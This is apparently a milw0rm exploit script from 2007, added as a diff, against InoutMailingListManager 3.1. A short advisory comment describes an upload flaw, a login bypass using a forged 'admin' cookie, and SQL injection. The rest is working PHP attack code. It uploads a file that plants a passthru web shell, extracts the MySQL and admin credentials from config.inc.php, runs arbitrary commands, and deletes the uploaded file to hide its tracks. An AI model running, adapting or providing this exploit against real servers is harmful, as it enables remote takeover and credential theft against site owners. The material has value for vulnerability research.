@@ -1,0 +1,236 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?
+echo "
+InoutMailingListManager <= 3.1 Command Execution Exploit + Login Retrieve + Advisory
+by BlackHawk <hawkgotyou@gmail.com> <http://itablackhawk.altervista.org>
+Thanks to rgod for the php code and Marty for the Love
+";
+if ($argc<4) {
+echo "Usage: php ".$argv[0]." Site CMD
+Host:          target server (ip/hostname)
+Path:          path of phpMyNewsletter
+CMD:           a shell command
+Example:
+php ".$argv[0]." localhost /inout/ cat /etc/password";
+
+die;
+}
+
+/*
+Multiple Vuln can be found in this NewsLetter Script.
+
+I) FCKEditor Vuln
+
+This script uses an old version of FCKEditor, so you can upload arbitrary file with:
+
+[dir]\FCKeditor\editor\filemanager\browser\default\connectors\php\connector.php
+
+(See rgod exploits for more info on it)
+
+
+II) Login-Bypass
+
+This is the code to check admin rights:
+
+if(!isset($_COOKIE['admin']))
+{
+header("Location:index.php");
+}
+
+1st: everyone can create a cookie named 'admin'
+2nd: you neither have to do it, because the script doesn't die after the check..
+
+This exploit Uses this vuln to create the shell.
+With Admin rights try to upload a PHP attachment, run it to retrieve config.inc.php and
+create a piggy_marty.php file. After that the script delete the uploaded attachment to leave
+no trace.
+
+III) SQL Injections
+
+There are SQL Injections EVERYWERE!
+
+one 4 all, changename.php:
+
+$result=mysql_query("select value from ".$tableprefix."ea_extraparam where eid=$id");
+
+
+
+BlackHawk <hawkgotyou@gmail.com>
+*/
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$port=80;
+$proxy="";
+$cmd="";
+for ($i=3; $i<=$argc-1; $i++){
+$cmd.=" ".$argv[$i];
+}
+$cmd=urlencode($cmd);
+
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+echo "Step 0 - Check if piggy_marty.php already exist..\r\n";
+$packet ="GET ".$p."attachments/696969/piggy_marty.php?cmd=$cmd HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+if (strstr($html,"666999"))
+{
+  echo "Exploit succeeded...\r\n";
+  $temp=explode("666999",$html);
+  die("\r\n".$temp[1]."\r\n");
+}
+
+echo "Step1 - Create a dir for the exploit\r\n";
+$packet="GET ".$p."attach.php?id=696969 HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+sleep(3);
+echo "Step2 - Upload The exploit Creator & Config Disclosure\r\n";
+$data="-----------------------------7d529a1d23092a\r\n";
+$data.="Content-Disposition: form-data; name=\"file\"; filename=\"piggy_marty_creator.php\"\r\n";
+$data.="Content-Type:\r\n\r\n";
+$data.="<?php
+\$fp=fopen('piggy_marty.php','w');
+fputs(\$fp,'<?php error_reporting(0);
+set_time_limit(0);
+if (get_magic_quotes_gpc()) {
+\$_GET[cmd]=stripslashes(\$_GET[cmd]);
+}
+echo 666999;
+passthru(\$_GET[cmd]);
+echo 666999;
+?>');
+fclose(\$fp);
+chmod('piggy_marty.php',777);
+include '../../config.inc.php';
+echo 'delimitator'.\$mysql_server.'|'.\$mysql_username.'|'.\$mysql_password.'|'.\$mysql_dbname.'|'.\$username.'|'.\$password;
+?>\r\n";
+$data.="-----------------------------7d529a1d23092a--\r\n";
+$packet="POST ".$p."attachfiles.php?id=696969 HTTP/1.0\r\n";
+$packet.="CLIENT-IP: 999.999.999.999\r\n";//spoof
+$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
+$packet.="Referer: http://".$host.$path."/example.html\r\n";
+$packet.="Accept-Language: it\r\n";
+$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d529a1d23092a\r\n";
+$packet.="Accept-Encoding: gzip, deflate\r\n";
+$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Content-Length: ".strlen($data)."\r\n";
+$packet.="Connection: Close\r\n";
+$packet.="Cache-Control: no-cache\r\n";
+$packet.="Cookie: admin=BlackHawk\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+sleep(3);
+echo "Step3 - Create The Shell and Retrieve Login Information\r\n";
+$packet="GET ".$p."attachments/696969/piggy_marty_creator.php HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+$temp=explode('delimitator',$html);
+list($myserver,$myusername,$mypassword,$mydbname,$lgnusername,$lgnpassword)=explode('|',$temp[1]);
+echo "
+
+--- INFO FROM CONFIG.INC.PHP ---
+
+MySQL Server: $myserver
+MySQL Username: $myusername
+MySQL Password: $mypassword
+MySQL Database: $mydbname
+
+Login: $lgnusername
+Password: $lgnpassword
+
+--- END INFO ---
+
+";
+echo "Step4 - Remove Shell Creator\r\n";
+$packet="GET ".$p."attach.php?id=696969 HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+$temp=explode('piggy_marty_creator.php&nbsp;&nbsp;&nbsp; <a href="removeattach.php?id=',$html);
+$id=explode('&cid=696969',$temp[1]);
+$packet="GET ".$p."removeattach.php?cid=696969&id=".$id[0]." HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+
+echo "Step 5 - Check if piggy_marty.php already exist..\r\n";
+$packet ="GET ".$p."attachments/696969/piggy_marty.php?cmd=$cmd HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+$packet.=$data;
+sendpacketii($packet);
+if (strstr($html,"666999"))
+{
+  echo "Exploit succeeded...\r\n";
+  $temp=explode("666999",$html);
+  die("\r\n".$temp[1]."\r\n");
+}
+?>
+
+# milw0rm.com [2007-04-10]
